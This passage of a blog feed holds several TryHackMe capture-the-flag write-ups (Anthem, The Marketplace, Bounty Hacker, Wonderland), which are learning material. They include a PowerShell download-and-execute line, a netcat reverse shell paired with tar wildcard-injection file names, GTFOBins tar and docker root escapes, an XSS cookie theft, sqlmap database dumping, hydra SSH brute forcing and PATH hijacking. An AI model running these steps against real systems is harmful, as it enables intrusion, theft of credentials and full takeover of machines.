writer might occasionally forget about them), and <code>robots.txt</code> did not
disappoint. Aside from giving as a direct <i>flag</i>, it showed that the
target host uses the Umbraco CMS, and it&rsquo;s sign-in page is also revealed. 
</p>


<div id="orgca003cb" class="figure">
<p><img src="posts/images/20231021_105217_screenshot.png" alt="20231021_105217_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Robots.txt contents</p>
</div>


<div id="orgc20e7e9" class="figure">
<p><img src="posts/images/20231021_105556_screenshot.png" alt="20231021_105556_screenshot.png">
</p>
<p><span class="figure-number">Figure 3: </span>Umbraco Sign-in Page</p>
</div>

<p>
Sadly, however, <code>security.txt</code> and <code>sitemap.xml</code> turned out to be empty,
lacking any information.
</p>
</div>
</div>
<div id="outline-container-org83bc229" class="outline-4">
<h4 id="org83bc229"><span class="section-number-4">1.2.3.</span> <a href="#org83bc229">Finding the administrator</a></h4>
<div class="outline-text-4" id="text-1-2-3">
<p>
At this point we have a lot of information about the target system,
yet no information on the administrator (other than the contents of an
article informing us of his passing), so we need to dig a little bit more.
</p>

<p>
I got relatively stuck here, so I started searching through the pages&rsquo;
HTML hoping that a comment might reveal their identity. (As you can
see in the images below, after thinking of the possibility that a flag
exists hidden there, I searched with &rsquo;thm&rsquo;, to make sure I did not
miss anything).
</p>


<div id="org1632baf" class="figure">
<p><img src="posts/images/20231021_105932_screenshot.png" alt="20231021_105932_screenshot.png">
</p>
<p><span class="figure-number">Figure 4: </span>Another random flag found during this stage</p>
</div>


<div id="org8580163" class="figure">
<p><img src="posts/images/20231021_110055_screenshot.png" alt="20231021_110055_screenshot.png">
</p>
<p><span class="figure-number">Figure 5: </span>Another random flag</p>
</div>

<p>
After skimming through the pages and realizing that the information I
wanted is not there, I tried the default credentials on the Umbraco
web portal, hoping that (since its a common misconfiguration) no one
had bothered changing them:
</p>


<div id="orgbabb9e6" class="figure">
<p><img src="posts/images/20231021_110556_screenshot.png" alt="20231021_110556_screenshot.png">
</p>
<p><span class="figure-number">Figure 6: </span>No luck</p>
</div>

<p>
At this point I seriously considered bruteforcing Jane Doe&rsquo;s RDP
credentials (knowing that her email is <code>jd@anthem.com</code>). I did not,
though, due to this statement in the problem&rsquo;s definition:
</p>
<blockquote>
<p>
In this room, you don&rsquo;t need to brute force any login page. Just your preferred browser and Remote Desktop.
</p>
</blockquote>

<p>
Since there were no input fields, nor parameters to check for
injections and the website seemed like a static one, performing OSINT
for the administrator was the only logical next step:
</p>
<ul class="org-ul">
<li>I thought I had seen the article &ldquo;written for him&rdquo; somewhere, so I
googled it, and turns out, that in its complete form, refers to
&rsquo;Solomon Grundy&rsquo;, which (after checking with THM&rsquo;s answer), turns
out to be the admin&rsquo;s name</li>
<li>Their email, asked elsewhere, is easy enough to derive knowing that:
Jane Doe translates to jd.</li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-org782419a" class="outline-2">
<h2 id="org782419a"><span class="section-number-2">2.</span> <a href="#org782419a">Trying RDP out</a></h2>
<div class="outline-text-2" id="text-2">
<p>
We now know the administrator&rsquo;s username, and we have a potential
password, so checking RDP out seems like a good choice: it was.
</p>


<div id="org9ed2e69" class="figure">
<p><img src="posts/images/20231021_112003_screenshot.png" alt="20231021_112003_screenshot.png">
</p>
<p><span class="figure-number">Figure 7: </span>Got the root flag</p>
</div>


<div class="note" id="org855cc23">
<p>
After answering the questions on THM I realized that I had missed one,
presumably hidden within the source code, nice 
</p>

</div>


<div id="orgf053f45" class="figure">
<p><img src="posts/images/20231021_112223_screenshot.png" alt="20231021_112223_screenshot.png">
</p>
<p><span class="figure-number">Figure 8: </span>Completing the last web flag</p>
</div>
</div>
</div>
<div id="outline-container-org124053e" class="outline-2">
<h2 id="org124053e"><span class="section-number-2">3.</span> <a href="#org124053e">Privilege Escalation</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Having limited experience with windows, I relied heavily on
<a href="https://swisskyrepo.github.io/">PayloadsAllTheThings</a>, testing this first:
</p>

<div class="org-src-container">
<pre class="src src-powershell" id="org2329a89">bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); 
</pre>
</div>

<p>
It did not seem to work, and figuring that getting admin rights would
be much simpler since the hint was &ldquo;it is hidden&rdquo;, I decided to
manually check some of the most common folders I had access to:
</p>
<ul class="org-ul">
<li>In Documents there was an RDP file hidden, getting my hopes up,
before I realized that there were no parameters saved on it, meaning
that it was useless.</li>
<li>After checking the rest of the hard drive, I saw a hidden folder
titled backup. Promising</li>
</ul>

<p>
Inside <code>backup</code> there was a file called restore, which I had no
permission to read, but seeing that I was the owner, I edited its
properties so that I could open it properly:
</p>


<div id="org4a820f7" class="figure">
<p><img src="posts/images/20231021_113902_screenshot.png" alt="20231021_113902_screenshot.png">
</p>
<p><span class="figure-number">Figure 9: </span>Got a password-like string</p>
</div>

<blockquote>
<p>
Administrator:newlyFoundString
</p>
</blockquote>
<p>
Seems like a good combination to choose, so I try to view
<code>Administrator</code>&rsquo;s home folder:
</p>


<div id="orgaa72a91" class="figure">
<p><img src="posts/images/20231021_114259_screenshot.png" alt="20231021_114259_screenshot.png">
</p>
<p><span class="figure-number">Figure 10: </span>Final Flag</p>
</div>

<p>
&rsquo;twas good.
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>THM: The Marketplace</title>
<link>posts/20231022_thm_the_marketplace.html</link>
<pubDate>Sun, 22 Oct 2023 18:31:00 +0300</pubDate>
<guid>posts/20231022_thm_the_marketplace.html</guid>
<description>
<![CDATA[<div id="outline-container-org864e38d" class="outline-2">
<h2 id="org864e38d"><span class="section-number-2">1.</span> <a href="#org864e38d">Reconnaisance</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Running a quick <code>nmap</code> scan to get some initial information on the
target system:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgcd4ceeb">nmap -sV -sC -oN nmap.initial 10.10.146.88
</pre>
</div>

<p>
It gives us lot&rsquo;s of information:
</p>
<pre class="example" id="org2cca6ae">
Nmap scan report for ip-10-10-146-88.eu-west-1.compute.internal (10.10.146.88)
Host is up (0.00021s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (EdDSA)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-title: The Marketplace
MAC Address: 02:3C:29:73:B9:79 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

<p>
First things first, the target machine runs an ssh and (at least) one
http server. After going for some web enumeration, I started this
<i>fuller</i> scan, to check whether I had missed something with the previous
one.
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org5198f4d">nmap -p- -T4 10.10.146.88 | tee nmap.full
</pre>
</div>

<p>
It&rsquo;s output was the same:
</p>
<pre class="example" id="orga1232ec">
Nmap scan report for ip-10-10-146-88.eu-west-1.compute.internal (10.10.146.88)
Host is up (0.00040s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
32768/tcp open  filenet-tms
MAC Address: 02:3C:29:73:B9:79 (Unknown)
</pre>
</div>
<div id="outline-container-orgf4d017d" class="outline-3">
<h3 id="orgf4d017d"><span class="section-number-3">1.1.</span> <a href="#orgf4d017d">Web Analysis</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
I checked for <code>robots.txt, security.txt, sitemap.xml</code> files, out of
which only the first existed, without much information available to us:
</p>

<div id="org8b2e594" class="figure">
<p><img src="posts/images/20231022_185121_screenshot.png" alt="20231022_185121_screenshot.png">
</p>
<p><span class="figure-number">Figure 1: </span>Robots.txt contents</p>
</div>

<p>
Then, I ran <code>gobuster</code> while manually checking the website out:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orga81b9a6">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.146.88 | tee gobuster.bigtxt
</pre>
</div>

<p>
Its output was not much
</p>
<pre class="example" id="org91f33c7">
==============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.146.88
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/10/22 16:58:58 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/ADMIN (Status: 403)
/Admin (Status: 403)
/Login (Status: 200)
/admin (Status: 403)
/images (Status: 301)
/login (Status: 200)
/messages (Status: 302)
/new (Status: 302)
/robots.txt (Status: 200)
/signup (Status: 200)
/stylesheets (Status: 301)
===============================================================
2023/10/22 16:59:32 Finished
=========================================================
</pre>
</div>
<div id="outline-container-org87b9572" class="outline-4">
<h4 id="org87b9572"><span class="section-number-4">1.1.1.</span> <a href="#org87b9572">Creating a <code>test</code> user</a></h4>
<div class="outline-text-4" id="text-1-1-1">
<p>
Since the site was way too simple (I think about 4 almost blank
pages), I created a <code>test</code> user to see what extra functionality logging
in offered:
</p>


<div id="orgb67edc2" class="figure">
<p><img src="posts/images/20231022_190304_screenshot.png" alt="20231022_190304_screenshot.png">
</p>
<p><span class="figure-number">Figure 2: </span>Allowing for new listings and messages(!)</p>
</div>

<p>
At this point I&rsquo;m thinking that a Blind XSS might be the way to go.
</p>

<p>
In the new listings page we get that no file may be uploaded <b>due to
security issues</b>. That&rsquo;s not really a problem
</p>


<div id="org49d35c6" class="figure">
<p><img src="posts/images/20231022_190913_screenshot.png" alt="20231022_190913_screenshot.png">
</p>
<p><span class="figure-number">Figure 3: </span>New listings page</p>
</div>


<p>
I then created a listing with a sample XSS payload for proof of
concept. It worked fine.
</p>


<div id="org0160e97" class="figure">
<p><img src="posts/images/20231022_191002_screenshot.png" alt="20231022_191002_screenshot.png">
</p>
<p><span class="figure-number">Figure 4: </span>Creating a new listing</p>
</div>





<div id="orgc27af93" class="figure">
<p><img src="posts/images/20231022_191112_screenshot.png" alt="20231022_191112_screenshot.png">
</p>
<p><span class="figure-number">Figure 5: </span>Working XSS <code>alert(1)</code> payload</p>
</div>

<p>
The problem, however, is that this is not enough. Ideally, I would
have to use an actual payload on a page that would be viewed by the
admins: These two buttons might be helpful for that, but for the time
being, checking the website&rsquo;s cookies seems equally promising
</p>


<div id="org9169bb9" class="figure">
<p><img src="posts/images/20231022_191849_screenshot.png" alt="20231022_191849_screenshot.png">
</p>
<p><span class="figure-number">Figure 6: </span>Way to contact PPL (pun intended)</p>
</div>

<p>
The cookie is of the typical form:
</p>
<pre class="example" id="orgdd0be6a">
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyJ1c2VySWQiOjYsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjk3OTkwMTQ4fQNxRVUKaYnmQAxWMchI-rMWA2C0FFOx-XXXdtV20Xe04
</pre>
<p>
which, after decoding (it obviously is base64 encoded) reveals its
three parts:
</p>
<pre class="example" id="orgc5ff4f1">
{"alg":"HS256","typ":"JWT"}
{"userId":6,"username":"test","admin":false,"iat":1697990148}
qEU i@V1H`Suvvw
</pre>

<p>
At this point I could try crafting a cookie like this:
</p>
<pre class="example" id="org88b0494">
{"alg":"none","typ":"JWT"}
{"userId":0,"username":"admin","admin":true,"iat":1697990148}

</pre>

<p>
However, I do not know the username associated with ID:0, and I know
for a fact that <code>admin</code> user does not exists (I tried creating a user
<code>&lt;space&gt;admin</code>, hoping that would get me somewhere)
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org9f20ed8" class="outline-2">
<h2 id="org9f20ed8"><span class="section-number-2">2.</span> <a href="#org9f20ed8">XSS Exploitation</a></h2>
<div class="outline-text-2" id="text-2">
<p>
I first created a listing that would get me the cookie of anyone
viewing it:
</p>

<div id="orgfb725ac" class="figure">
<p><img src="posts/images/20231022_193437_screenshot.png" alt="20231022_193437_screenshot.png">
</p>
<p><span class="figure-number">Figure 7: </span>Malicious listing</p>
</div>

<p>
I, then tested it on myself, and it worked just fine, so I proceeded
reporting it to the admins and hoping that someone would view it. It
did not disappoint.
</p>

<p>
When I got back from my water break, a cookie was waiting for me!!
</p>

<div id="org97b9246" class="figure">
<p><img src="posts/images/20231022_193832_screenshot.png" alt="20231022_193832_screenshot.png">
</p>
<p><span class="figure-number">Figure 8: </span>Admin&rsquo;s cookieeeeeee!</p>
</div>

<p>
I used it and logged into the <code>/admin</code> page: The first flag was waiting
for me there !
</p>


<div id="org23ea85e" class="figure">
<p><img src="posts/images/20231022_194020_screenshot.png" alt="20231022_194020_screenshot.png">
</p>
<p><span class="figure-number">Figure 9: </span>We&rsquo;re getting somewhere.</p>
</div>

<p>
We see now that :
</p>
<ul class="org-ul">
<li>There are two administrators (users 4 and 5 are my creation :P),
<code>jake</code> and <code>michael</code>. Ideally we would find a way to log in as either
one, through SSH to the target machine.</li>
<li>I can not give admin rights, I can only delete accounts.</li>
<li>The admin&rsquo;s messages are empty, so there is unfortunately no secret
password there.</li>
</ul>

<p>
I got stuck here, the only two options I&rsquo;m thinking of are:
</p>
<ol class="org-ol">
<li>Trying to bruteforce one of the two admin accounts</li>
<li>Hoping for a known vulnerability of either <code>nginx</code> or <code>node.jear</code></li>
</ol>

<p>
Avoiding bruteforce when another option is possible, I opted for 2.
</p>
<ul class="org-ul">
<li>Though I found some vulnerabilities, potentially useful under
different circumstances, for <code>nginx 1.19.2</code>, no exploit was readily
available on exploit-db, and I doubt that a medium difficulty room
would require me to develop my own exploit.</li>
<li>I could not find any information on <code>node.js</code> however. If any reader
has any suggestions for this part, I would love to hear them.</li>
</ul>

<p>
Seems like 1 is sadly the way to go&#x2026; It was not. (I did not like
that option, and I was just sure I had missed something, so I searched
for a writeup online, I had overlooked an SQL Injection entry point)
</p>
</div>
</div>
<div id="outline-container-org9d2c249" class="outline-2">
<h2 id="org9d2c249"><span class="section-number-2">3.</span> <a href="#org9d2c249">SQL Injection</a></h2>
<div class="outline-text-2" id="text-3">
<p>
More specifically, when selecting a user in the administration panel,
the website would point us to <code>/admin?user=1</code>, which after testing with
the old classic <code>' OR 1=1;--</code>, shows an error:
</p>


<div id="org3a83383" class="figure">
<p><img src="posts/images/20231022_200202_screenshot.png" alt="20231022_200202_screenshot.png">
</p>
<p><span class="figure-number">Figure 10: </span>SQL Error</p>
</div>

<p>
Seeing that an SQLi could be beneficial, I used <code>sqlmap</code>:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgfbbe34c">sqlmap -u http://10.10.146.88/admin?<span class="org-variable-name">user</span>=1 --batch
</pre>
</div>

<p>
It provided no output, and I did not like it, so I checked the output
for any hints why that happened. Immediately <code>HTTP error code 403</code>
hinted the obvious: I had not taken advantage of my admin cookie.
</p>

<p>
Even after putting my cookie on, however, the problem persisted, and
even caused the cookie to be renewed, and no longer valid. It took
some tinkering for me to realize (through experimentation) that the
problem was in the sheer volume of my requests, and adding <code>--delay=2</code>
eventually fixed the problem:
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org966c7b6">sqlmap --url=<span class="org-string">'http://10.10.146.88/admin?user=1'</span> --cookie=<span class="org-string">'token=DATOKEN'</span> --technique=U --delay=2 --dump
</pre>
</div>

<p>
Important notice: make sure to renew your attack box&rsquo;s timer every now
and then especially if you take breaks to tidy up the house while a
script is running. I did not, and lost all the output of sqlmap, on
the very first time it actually worked.
</p>


<p>
Long story short, we get some really nice data through <code>sqlmap</code>, but the
most important is hidden in a message there: we get the password for <code>jake</code>
</p>

<p>
And after logging in we get the second flag:
</p>

<div id="org6a1a9e4" class="figure">
<p><img src="posts/images/20231022_205347_screenshot.png" alt="20231022_205347_screenshot.png">
</p>
<p><span class="figure-number">Figure 11: </span>The second flag</p>
</div>
</div>
</div>
<div id="outline-container-orgc73e8bb" class="outline-2">
<h2 id="orgc73e8bb"><span class="section-number-2">4.</span> <a href="#orgc73e8bb">Privilege escalation</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Knowing that the last flag is a file called <code>root.txt</code> I used <code>find</code>
hoping its output to show me its location. No luck though.
</p>

<p>
Next step was to check what I can <code>sudo</code>:
</p>
<ul class="org-ul">
<li><code>sudo -l</code> show that I can run a specific file as sudo without password</li>
<li>After inspecting it becomes relatively obvious that what I want now
is to use a properly named file to mess with the <code>tar cf
  /opt/backups/backup.tar *</code> command that runs within that script. I
did not remember exactly how, but a little bit of googling saved the
day: (<a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</a>)</li>
</ul>

<p>
I created a directory and worked in it (<code>wrk</code>), but it is not necessary.
In fact, this will work anywhere!
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org534e773"><span class="org-builtin">echo</span> <span class="org-string">"rm -f /tmp/lhennp;mkfifo /tmp/lhennp; nc 10.10.199.235 6969 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp"</span> &gt; shell.sh
<span class="org-builtin">echo</span> <span class="org-string">""</span> &gt; <span class="org-string">"--checkpoint-action=exec=sh shell.sh"</span>
<span class="org-builtin">echo</span> <span class="org-string">""</span> &gt; --checkpoint=1
</pre>
</div>

<p>
Please do not make the mistake of running the command as is :P. Run it
as michael with:j
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org8db9ba3">sudo -u michael /opt/backups/backup.sh 
</pre>
</div>

<p>
Finally we get the rev shell, and make it work a little bit better
with some python:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgbc5ad81">python -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
</pre>
</div>

<p>
The thing is that <code>michael</code> does not give us any advantage that <code>jake</code>
does not have. If anything, michael can not even run <code>sudo -l</code> without a
password! Browsing through my privesc notes, I saw a hint about <code>id</code>
which showed that <code>michael</code> is a member of the <code>docker</code> group
</p>

<p>
Listing the docker running instances got me thinking of using them to
get root privileges, which actually worked using the second command,
found in <a href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a>
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org73eaa24">docker ps
</pre>
</div>

<div class="org-src-container">
<pre class="src src-bash" id="orge1b745f">docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</pre>
</div>

<p>
After becoming root there was nothing else to do. It was finally over. 
</p>


<div id="org35c7c67" class="figure">
<p><img src="posts/Privilege_escalation/20231022_212928_screenshot.png" alt="20231022_212928_screenshot.png">
</p>
<p><span class="figure-number">Figure 12: </span>THE END</p>
</div>
</div>
</div>
<div id="outline-container-orgb5d6ee4" class="outline-2">
<h2 id="orgb5d6ee4"><span class="section-number-2">5.</span> <a href="#orgb5d6ee4">Conclusion</a></h2>
<div class="outline-text-2" id="text-5">
<p>
I liked the room, a lot and it was on a good level for me to try and
complete, being neither too easy nor too hard. Not noticing the SQL
injection is something I plan to work on, and I am not satisfied with
my performance in the post-exploitation stage, getting stuck before
using the <code>id</code> command, but this is part of learning so&#x2026; C&rsquo;est la vie.  
</p>

<div class="tenor-gif-embed" data-postid="23474613" data-share-method="host" data-aspect-ratio="1.73913" data-width="100%"><a href="https://tenor.com/view/luffy-gif-23474613">Luffy GIF</a>from <a href="https://tenor.com/search/luffy-gifs">Luffy GIFs</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
</div>
</div>
]]>
</description></item>
<item>
<title>THM: Bounty Hacker</title>
<link>posts/20231105_thm_bounty_hacker.html</link>
<pubDate>Sun, 05 Nov 2023 21:54:00 +0200</pubDate>
<guid>posts/20231105_thm_bounty_hacker.html</guid>
<description>
<![CDATA[<p>
Ever since the last room I published here, every time that I logged in
TryHackMe I would only complete <i>tutorial</i> rooms (except for the Net Sec
Challenge, that was not much of a challenge), revising stuff I had
already learned mainly, and that got to a point that it was tedious.
On the one hand, I want to complete the suggested paths, making sure
that I have the right tools (and mindset) to take on more difficult
CTFs (and eventually take part in a hackathon or two), but &#x2026; it gets
boring at times.
</p>


<p>
That&rsquo;s the reason why I now am here (even though I suppose that taking
on a medium difficulty room instead of an easy one would be better)!
</p>
<div id="outline-container-org1422c7b" class="outline-2">
<h2 id="org1422c7b"><span class="section-number-2">1.</span> <a href="#org1422c7b">Recon</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Like always: a quick <code>nmap</code> scan
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org687338b"><span class="org-variable-name">IP</span>=10.10.61.63
nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
</pre>
</div>

<p>
That informs us of three open ports:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> 21: ftp, allowing for anonymous login</li>
<li class="off"><code>[&#xa0;]</code> 22: ssh</li>
<li class="off"><code>[&#xa0;]</code> 80: http, an apache web server</li>
</ul>

<p>
After putting on a complete port scan to see if our initial scan
missed anything, we visit the website.
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org93f409e">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org1899ac7" class="outline-2">
<h2 id="org1899ac7"><span class="section-number-2">2.</span> <a href="#org1899ac7">The Website</a></h2>
<div class="outline-text-2" id="text-2">
<p>
First things first, after visiting the website it looks like its a
simple static website, comprised of just one html page, in which
Avatar (the airbender) characters seem to be assigning the task of
getting into the target system to us. Nothing is hidden in the html.
</p>

<p>
Gobuster also did not reveal any promising files.
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgb2efccd">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.61.63
</pre>
</div>
</div>
</div>
<div id="outline-container-org0d18829" class="outline-2">
<h2 id="org0d18829"><span class="section-number-2">3.</span> <a href="#org0d18829">The FTP server</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Using the standard command we can visit the ftp server as <code>anonymous</code>.
</p>

<p>
If performing any commands returns:
</p>
<pre class="example" id="orge502019">
530 Please login with USER and PASS.
</pre>
<p>
make sure that you did not actually press <code>Enter</code> when logging in
because that would make you enter as <code>root</code> and thereby not be
authenticated on the server. Not proud of that :P.
</p>

<p>
Running <code>ls</code> there we gain knowledge of two files:
</p>
<ul class="org-ul">
<li><code>locks.txt</code>, which turns out to be a wordlist, hinting at a possible
bruteforce attack on the ssh server</li>
<li><code>task.txt</code>, containing two Avatar-related (?) tasks, and giving a
small <i>flag</i></li>
</ul>
</div>
</div>
<div id="outline-container-orgb931d22" class="outline-2">
<h2 id="orgb931d22"><span class="section-number-2">4.</span> <a href="#orgb931d22">The SSH server</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Trying our luck with the wordlist found above, eventually gives us the
password for the user <code>lin</code>
</p>
<div class="org-src-container">
<pre class="src src-bash" id="org6a61e70">hydra -l lin -P locks.txt ssh://$<span class="org-variable-name">IP</span> -t 1
</pre>
</div>

<p>
At this point we have successfully gained access to the target
machine, and by visiting lin&rsquo;s Desktop, we get the first actual flag.
</p>
</div>
</div>
<div id="outline-container-orgf6fac1e" class="outline-2">
<h2 id="orgf6fac1e"><span class="section-number-2">5.</span> <a href="#orgf6fac1e">Privilege Escalation</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Just running <code>sudo -l</code> shows that we can run <code>/bin/tar</code> as root.
</p>

<p>
Obviously, we go to <a href="https://gtfobins.github.io/#at">GTFObins</a> and following the steps we get root
privileges in no time:
</p>

<div class="org-src-container">
<pre class="src src-bash" id="org864a85e">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="org-variable-name">exec</span>=/bin/sh
</pre>
</div>
</div>
</div>
<div id="outline-container-orga2be1d8" class="outline-2">
<h2 id="orga2be1d8"><span class="section-number-2">6.</span> <a href="#orga2be1d8">Conclusion</a></h2>
<div class="outline-text-2" id="text-6">
<p>
It was a nice room, arguably a wrong choice for me, but a good place
to start I suppose, covering a little bit of the basics. 
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>THM: Wonderland</title>
<link>posts/20231106_thm_wonderland.html</link>
<pubDate>Mon, 06 Nov 2023 23:49:00 +0200</pubDate>
<guid>posts/20231106_thm_wonderland.html</guid>
<description>
<![CDATA[<div id="outline-container-org951358f" class="outline-2">
<h2 id="org951358f"><span class="section-number-2">1.</span> <a href="#org951358f">Recon</a></h2>
<div class="outline-text-2" id="text-1">
<p>
The initial nmap scan gives us some starting info:
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> port 22 is open, so we will probably have to get some
user/password combination to get ssh access to the target machine</li>
<li class="off"><code>[&#xa0;]</code> port 80 is open, a web server that we should check thoroughly</li>
</ul>
<div class="org-src-container">
<pre class="src src-bash"><span class="org-variable-name">IP</span>=10.10.52.199
nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
</pre>
</div>

<p>
Before moving on to the web-server analysis:
</p>
<div class="org-src-container">
<pre class="src src-bash">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
</pre>
</div>
</div>
<div id="outline-container-org120aa4c" class="outline-3">
<h3 id="org120aa4c"><span class="section-number-3">1.1.</span> <a href="#org120aa4c">Web Server</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
Just by visiting the website we notice that:
</p>
<ul class="org-ul">
<li>The website seems to be plain html</li>
<li>There is an <code>/img</code> directory (might be useful?)</li>
</ul>

<p>
Running <code>gobuster</code> against it:
</p>
<div class="org-src-container">
<pre class="src src-bash">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$<span class="org-variable-name">IP</span>
</pre>
</div>

<p>
Two new directories are revealed:
</p>
<ul class="org-ul">
<li><code>poem</code></li>
<li><code>r</code></li>
</ul>

<p>
Due to the <i>keep going</i> in <code>r</code>, I decided to run <code>gobuster</code> again, this time
on the /r subdirectory, revealing <code>r/a</code>, and then (in the next
iteration) a <code>b</code>, pointing that the final path will most probably be
<code>r/a/b/b/i/t</code>. 
</p>

<p>
There hidden lies a possible username:password combination:
</p>

<p>
Testing it and&#x2026;we have access as <code>alice</code>
</p>
</div>
</div>
</div>
<div id="outline-container-org04d9384" class="outline-2">
<h2 id="org04d9384"><span class="section-number-2">2.</span> <a href="#org04d9384">Alice</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Strangely enough, good ol&rsquo; find does not give us the position of
<code>user.txt</code>, hinting that we will have to login as a different user in
order to get it.
</p>
<pre class="example" id="org725dadd">
alice@wonderland:/$ find . -name user.txt 2&gt;/dev/null
</pre>

<p>
The different users, as listed by <code>cat /etc/passwd</code>:
</p>
<pre class="example" id="org2a25fa7">
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
</pre>

<p>
<code>sudo -l</code> shows us that there is a very peculiar command we can run as
<code>rabbit</code> (while being alice):
</p>

<pre class="example" id="orga815d19">
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</pre>

<p>
It obviously is the way to access rabbit&rsquo;s home directory and assume
their identity, however, I can not mess around with any element of the
command: both files are obviously not writeable for me, so I can not
modify them :/. Furthermore, I can not add any arguments to the
command, I can only use it as is.
</p>

<p>
Maybe play around with the <code>random</code> library? Nah, the file is also
properly protected.
</p>

<p>
As it turns out, what I initially thought possible was actually
possible: python path hijack on the rescue:
</p>
<ul class="org-ul">
<li>create a random.py file in current working directory</li>
<li>properly redefine the functions as one should</li>
</ul>


<p>
I then tinkered with the reverse shells in payloads all the things,
settling for a netcat one that got the job done
</p>
</div>
</div>
<div id="outline-container-orgd5844d1" class="outline-2">
<h2 id="orgd5844d1"><span class="section-number-2">3.</span> <a href="#orgd5844d1">Hopping away</a></h2>
<div class="outline-text-2" id="text-3">
<p>
After receiving the reverse shell in my netcat listener, the interface
was sadly unusable, so I had to <i>spice it up</i> with some simple python:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgf713a13">python3.6 -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span> <span class="org-comment-delimiter"># </span><span class="org-comment">python can not be found in the path</span>
</pre>
</div>


<p>
A strange teaParty file exists in <code>rabbit</code>&rsquo;s home directory, with SUID bit set!
</p>

<p>
After running it, it seems like a riddle, but no matter what input I
provide it says that a segmentation fault occurs! Should I try to
reverse engineer?
</p>

<p>
Just by using <code>cat teaParty</code>, we see that <code>date</code> gets used, so I could try
replacing it with a reverse shell  maybe or sh itself? 
</p>

<p>
The second option worked just fine with <code>bash -i</code>:
</p>
<div class="org-src-container">
<pre class="src src-bash" id="orgd9ceda2"><span class="org-variable-name">PATH</span>=<span class="org-string">"/home/rabbit:$PATH"</span>
<span class="org-builtin">echo</span> <span class="org-string">'bash -i'</span> &gt; date
./teaParty
</pre>
</div>

<p>
